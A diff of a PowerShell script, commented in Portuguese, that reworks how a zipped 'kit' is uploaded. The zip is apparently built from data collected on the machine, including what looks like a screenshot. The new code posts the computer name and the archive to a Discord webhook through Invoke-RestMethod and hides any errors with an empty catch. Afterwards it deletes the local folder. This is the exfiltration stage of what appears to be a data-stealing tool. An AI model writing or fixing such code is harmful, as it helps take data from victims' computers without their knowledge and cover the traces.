@@ -71,30 +71,14 @@ $g.Dispose(); $bmp.Dispose()
 $zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
 Compress-Archive -Path "$kit\*" -Destination $zip -Force
 
-# 11) Envia para o Discord (corpo montado sem aspas quebradas)
-$FileBin = [System.IO.File]::ReadAllBytes($zip)
-$Enc      = [System.Text.Encoding]::GetEncoding('iso-8859-1')
-$fileEnc  = $Enc.GetString($FileBin)
-$boundary = [System.Guid]::NewGuid().ToString()
-$CRLF     = "`r`n"
-
-$bodyLines = (
-    "--$boundary",
-    "Content-Disposition: form-data; name=`"content`"",
-    "",
-    "Kit $env:COMPUTERNAME – $(Get-Date)",
-    "--$boundary",
-    "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $zip)`"",
-    "Content-Type: application/octet-stream",
-    "",
-    $fileEnc,
-    "--$boundary--"
-) -join $CRLF
-
+# ---------- ENVIO DISCORD (jeito sem multipart) ----------
 try {
-    Invoke-RestMethod -Uri $hook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+    $msg  = "Kit $env:COMPUTERNAME – $(Get-Date)"
+    # 1) envia a mensagem
+    Invoke-RestMethod -Uri $hook -Method Post -ContentType "application/json" -Body (@{content=$msg} | ConvertTo-Json)
+    # 2) envia o arquivo
+    Invoke-RestMethod -Uri $hook -Method Post -InFile $zip -ContentType "application/zip"
 } catch {}
-
-
-# 12) Limpa só a pasta $kit
+# ---------- limpa ----------
 Remove-Item $kit -Recurse -Force
+
